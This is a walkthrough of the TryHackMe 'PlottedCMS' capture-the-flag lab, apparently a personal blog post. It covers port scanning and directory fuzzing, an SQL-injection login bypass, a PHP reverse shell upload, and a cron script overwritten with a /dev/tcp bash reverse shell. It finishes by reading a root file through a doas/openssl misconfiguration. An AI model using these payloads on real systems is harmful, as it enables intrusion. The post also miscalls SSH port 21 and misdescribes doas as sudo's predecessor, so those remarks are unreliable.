---
title: PlottedCMS TryHackMe Machine Writeup and Walkthrough
author: Gaurav Raj
date: 2022-02-22 15:40:00 +0530
categories: [CTF, TryHackMe]
tags:
  [
    ctf,
    tryhackme,
    thm,
    writeup,
    walkthrough,
    plottedcms,
    linux,
    file upload,
    php,
    shell,
    doas,
    thehackersbrain,
    gauravraj,
    gaurav raj,
    gaurav,
  ]
---

## Introduction

> TryHackMe Easy Level Machine

## Target

```bash
export IP=10.10.230.183
```

## Enumeration

First of all let's start by running our **Nmap** Scan

### Nmap

```bash
# Nmap 7.92 scan initiated Sat Feb 19 14:01:42 2022 as: nmap -sC -sV -A -v -oA nmap/initial 10.10.230.183
Increasing send delay for 10.10.230.183 from 0 to 5 due to 257 out of 855 dropped probes since last increase.
Increasing send delay for 10.10.230.183 from 5 to 10 due to 11 out of 12 dropped probes since last increase.
Increasing send delay for 10.10.230.183 from 10 to 20 due to 11 out of 12 dropped probes since last increase.
Increasing send delay for 10.10.230.183 from 20 to 40 due to 11 out of 12 dropped probes since last increase.
Increasing send delay for 10.10.230.183 from 40 to 80 due to 11 out of 15 dropped probes since last increase.
Increasing send delay for 10.10.230.183 from 80 to 160 due to 11 out of 15 dropped probes since last increase.
Increasing send delay for 10.10.230.183 from 160 to 320 due to 11 out of 13 dropped probes since last increase.
Increasing send delay for 10.10.230.183 from 320 to 640 due to 11 out of 12 dropped probes since last increase.
Increasing send delay for 10.10.230.183 from 640 to 1000 due to 11 out of 12 dropped probes since last increase.
Nmap scan report for 10.10.230.183
Host is up (0.26s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 a3:6a:9c:b1:12:60:b2:72:13:09:84:cc:38:73:44:4f (RSA)
|   256 b9:3f:84:00:f4:d1:fd:c8:e7:8d:98:03:38:74:a1:4d (ECDSA)
|_  256 d0:86:51:60:69:46:b2:e1:39:43:90:97:a6:af:96:93 (ED25519)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/19%OT=22%CT=1%CU=30451%PV=Y%DS=2%DC=T%G=Y%TM=6210AB9
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST1
OS:1NW6%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 37.543 days (since Thu Jan 13 01:03:15 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   219.31 ms 10.8.0.1
2   287.16 ms 10.10.230.183

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 19 14:04:35 2022 -- 1 IP address (1 host up) scanned in 174.47 seconds
```

So from our **Nmap** scan we got 3 ports open, **SSH - 21**, **HTTP - 80** and another **HTTP 445**.

### HTTP Enumeration

So now let's enumerate the **HTTP** Server on **port 80**.

![](/assets/images/plottedcms/Pasted image 20220222132402.png)

<p align='center'>Here we got the default <b>Apache2 Server Page</b>.</p>
So we don't have much to do here let's fire-off directory fuzzing. Here's the scan result.

```bash
┌──(elliot@archlinux)-[~/data/plottedcms]-[192.168.225.72]-[git:(main) ✗]
└─$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.20.24:445/FUZZ -c -t 50 -recursion -recursion-depth 1 | tee ffuf_445.log

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.20.24:445/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 222ms]
.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 222ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 245ms]
                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 245ms]
admin                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 220ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 198ms]
passwd                  [Status: 200, Size: 25, Words: 1, Lines: 2, Duration: 219ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 245ms]
shadow                  [Status: 200, Size: 25, Words: 1, Lines: 2, Duration: 250ms]
                        [Status: 200, Size: 931, Words: 66, Lines: 17, Duration: 250ms]
.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 251ms]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 263ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 263ms]
id_rsa                  [Status: 200, Size: 81, Words: 1, Lines: 2, Duration: 204ms]
________________________________________________
```

So here we have 3 files in here that looks interesting. **`passwd`**, **`shadow`** and **`id_rsa`** also we have a directory named **`admin`**. The **`admin`** directory have nothing in there. so let's check the files.

```bash
┌──(elliot@archlinux)-[~/data/plottedcms]-[192.168.225.72]-[git:(main) ✗]
└─$ cat id_rsa
VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE
┌──(elliot@archlinux)-[~/data/plottedcms]-[192.168.225.72]-[git:(main) ✗]
└─$ cat id_rsa | base64 -d
Trust me it is not this easy..now get back to enumeration :D%
┌──(elliot@archlinux)-[~/data/plottedcms]-[192.168.225.72]-[git:(main) ✗]
└─$ cat passwd
bm90IHRoaXMgZWFzeSA6RA==
┌──(elliot@archlinux)-[~/data/plottedcms]-[192.168.225.72]-[git:(main) ✗]
└─$ cat passwd | base64 -d
not this easy :D%
┌──(elliot@archlinux)-[~/data/plottedcms]-[192.168.225.72]-[git:(main) ✗]
└─$ cat shadow
bm90IHRoaXMgZWFzeSA6RA==
┌──(elliot@archlinux)-[~/data/plottedcms]-[192.168.225.72]-[git:(main) ✗]
└─$ cat shadow | base64 -d
not this easy :D%
┌──(elliot@archlinux)-[~/data/plottedcms]-[192.168.225.72]-[git:(main) ✗]
└─$
```

So all of these files have nothing interesting. so we don't have to do much with this port. we also have a webserver running on port **445** as we saw from our **Nmap** scan, let's check that out.

![](/assets/images/plottedcms/Pasted image 20220222140338.png)

<p align='center'>Port 445</p>

### Directory Fuzzing

So here we also have the Apache2 Server's Default Page. let's start our directory enumeration.
here's the **ffuf** scan result

```bash
┌──(elliot@archlinux)-[~/data/plottedcms]-[192.168.225.72]-[git:(main) ✗]
└─$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.214.35:445/FUZZ -c -t 50 | tee ffuf_445.log

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.214.35:445/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 401ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 399ms]
                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 1845ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3009ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 284ms]
management              [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 244ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 282ms]
:: Progress: [4614/4614] :: Job [1/1] :: 204 req/sec :: Duration: [0:00:29] :: Errors: 0 ::
```

so here we found a directory called `management` which looks interesting, let's take a look at it.

![](/assets/images/plottedcms/Pasted image 20220222141111.png)

So here we have a **login** button.
![](/assets/images/plottedcms/Pasted image 20220222141233.png)
here we have the login form which we passed successfully using just a basic **SQLi** payload `admin' or 1=1 -- -`.

## Getting Access

### Upload the Shell

![](/assets/images/plottedcms/Pasted image 20220222141538.png)
So after enumerating the admin panel for a while, found a **file upload** form under the **settings** tab, so here we tried to upload a **php-reverse-shell** and got a successfully hit and we got our **reverse shell** back.

```bash
┌──(elliot@archlinux)-[~/data/plottedcms]-[192.168.225.72]-[git:(main) ✗]
└─$ nc -nvlp 4444
Connection from 10.10.214.35:49944
Linux plotted 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 08:52:29 up 59 min,  0 users,  load average: 1.32, 1.31, 1.17
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@plotted:/$ ^Z
[1]  + 15789 suspended  nc -nvlp 4444
┌──(elliot@archlinux)-[~/data/plottedcms]-[192.168.225.72]-[git:(main) ✗]
└─$ stty raw -echo; fg
[1]  + 15789 continued  nc -nvlp 4444

www-data@plotted:/$ export TERM=xterm
www-data@plotted:/$ reset
```

Let's stablize our shell.

## Privilege Escalation

### Vertical Privilege Escalation

So while enumerating the machine, found that there are two users, **ubuntu** and **plot_admin**. which means we have to somehow get to that user, in order to get to the **root**.

```bash
www-data@plotted:/$ ls -al /var/www/scripts/
total 12
drwxr-xr-x 2 www-data   www-data   4096 Oct 28 09:10 .
drwxr-xr-x 4 root       root       4096 Oct 28 10:26 ..
-rwxrwxr-- 1 plot_admin plot_admin  141 Oct 28 09:10 backup.sh
www-data@plotted:/$
```

while enumerating the machine we have a directory named **scripts** under **/var/www/** which is owned by the user **www-data** which means we can replace that script with our own for getting a **reverse shell** back to us.

![](/assets/images/plottedcms/Pasted image 20220222144139.png)
here we can see that the script will run every minute in the system.

```bash
www-data@plotted:/var/www/scripts$ ls
backup.sh
www-data@plotted:/var/www/scripts$ rm backup.sh
rm: remove write-protected regular file 'backup.sh'? y
www-data@plotted:/var/www/scripts$ printf '#!/usr/bin/bash\nbash -c "bash -i >& /dev/tcp/10.8.82.14/5555 0>&1"' > backup.sh
www-data@plotted:/var/www/scripts$ chmod +x backup.sh
www-data@plotted:/var/www/scripts$
```

here we replaced the original **backup.sh** script with our own and get a reverse shell.

```bash
┌──(elliot@archlinux)-[~/data/plottedcms]-[192.168.225.72]-[git:(main) ✗]
└─$ nc -nvlp 5555
Connection from 10.10.12.199:56638
bash: cannot set terminal process group (1419): Inappropriate ioctl for device
bash: no job control in this shell
plot_admin@plotted:~$
```

![](/assets/images/plottedcms/Pasted image 20220222150454.png)

### Getting Root

After enumerating the machine for a while like checking for any suspicios or services, outdated packages or any sudo privileges we don't found anything interesting. so I went to find any **SUID** binaries.

```bash
plot_admin@plotted:~$ find / -type f -perm -4000 2>/dev/null
..........<snap>..........
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/at
/usr/bin/chsh
/usr/bin/umount
/usr/bin/doas
/usr/bin/newgrp
/usr/libexec/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
plot_admin@plotted:~$
```

so as we can see from the log we have the **doas** binary which have **SUID** bit set. now let's check for the configuration file of the **doas** command. for those who don't know about **doas**, so **doas** is like the previous version of the **sudo** command which is less bloated and generally less used than **sudo** or we can say **sudo** is a modern replacement for **doas** command.

```bash
plot_admin@plotted:~$ cat /etc/doas.conf
permit nopass plot_admin as root cmd openssl
plot_admin@plotted:~$
```

So from the **configuration file** we can see that our **plot_admin** user is in the configuration file and can run **openssl** command as the **root** user without asking for **password**.

so let's read out the root flag.

```bash
plot_admin@plotted:~$ LFILE=/root/root.txt
plot_admin@plotted:~$ doas -u root openssl enc -in "$LFILE"
Congratulations on completing this room!

xxxxxxxxxxxxxxxxxxxxxxxxxx

Hope you enjoyed the journey!

Do let me know if you have any ideas/suggestions for future rooms.
-sa.infinity8888
plot_admin@plotted:~$
```

So here we completed the machine. Thanks for reading, hope you enjoyed it, share if you like it.

